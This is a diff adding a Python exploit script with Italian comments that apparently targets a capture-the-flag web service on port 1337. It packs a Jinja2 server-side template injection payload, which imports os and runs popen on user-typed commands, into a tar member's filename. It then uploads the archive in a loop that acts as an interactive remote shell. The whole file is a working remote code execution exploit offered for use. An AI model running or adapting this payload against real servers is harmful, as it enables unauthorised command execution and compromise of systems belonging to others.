@@ -1,0 +1,48 @@
+import requests
+import tarfile
+import io
+import os
+import hashlib
+import random
+import string
+
+TARGET = 'http://<IP_o_DOMAIN>:1337/'  # <<<<<<<<<<<< Cambia questo
+
+def create_payload_tar(command):
+    # Costruisce il payload jinja2 corretto
+    payload = "{{request.application.__globals__.__builtins__.__import__('os').popen('" + command + "').read()}}.txt"
+
+    # Crea file tar in memoria
+    tarstream = io.BytesIO()
+    with tarfile.open(fileobj=tarstream, mode="w") as tar:
+        data = b"test"
+        info = tarfile.TarInfo(name="x" + payload + "y")  # wrapper con x,y per sicurezza
+        info.size = len(data)
+        tar.addfile(info, io.BytesIO(data))
+    tarstream.seek(0)
+    return tarstream
+
+def upload_tar(tarstream):
+    files = {'file': ('exploit.tar', tarstream)}
+    response = requests.post(TARGET, files=files)
+    if response.status_code == 200:
+        print("[+] Upload completato.")
+        if "View" in response.text:
+            part = response.text.split('href=\'/view/')[1]
+            view_url = part.split("'")[0]
+            print(f"[+] Vai a: {TARGET}view/{view_url}")
+        else:
+            print("[-] Non trovato link view.")
+    else:
+        print(f"[-] Errore upload: {response.status_code}")
+
+def main():
+    while True:
+        cmd = input("Shell> ")
+        if cmd.lower() in ['exit', 'quit']:
+            break
+        tarstream = create_payload_tar(cmd)
+        upload_tar(tarstream)
+
+if __name__ == "__main__":
+    main()
